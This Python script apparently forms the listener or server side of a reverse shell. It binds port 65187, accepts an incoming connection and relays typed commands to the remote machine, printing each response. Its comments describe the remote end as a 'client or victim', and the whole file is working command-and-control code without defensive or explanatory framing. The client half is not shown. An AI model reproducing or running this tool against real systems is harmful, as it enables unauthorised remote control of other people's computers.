import socket
import sys
##creating socket(for connecting two computer)
def create_socket():
    try:
        global host
        global port
        global s
        host= ""
        port= 65187
        s=socket.socket()
    except socket.error as msg:
        print("socket creation error"+str(msg))


###Binding and listning the connection
def binding_socket():
    try:
        global host
        global port
        global s
        print("binding the port"+str(port))
        s.bind((host,port))
        s.listen(5)

    except socket.error as msg:
        print("socket binding error"+str(msg)+"\n"+"retrying...")
        binding_socket()

##Establish connection with client (server must be listeninig)
def socket_accept():
    conn,address=s.accept()
    print("Connection ha been establish.!"+"IP"+address[0]+"|Port"+str(address[1]))
    send_command(conn)
    conn.close()

##Send command to friend\client or victim
def send_command(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_responce = str(conn.recv(1024),"utf-8")
            print(client_responce,end=" ")


def main():
    create_socket()
    binding_socket()
    socket_accept()

main()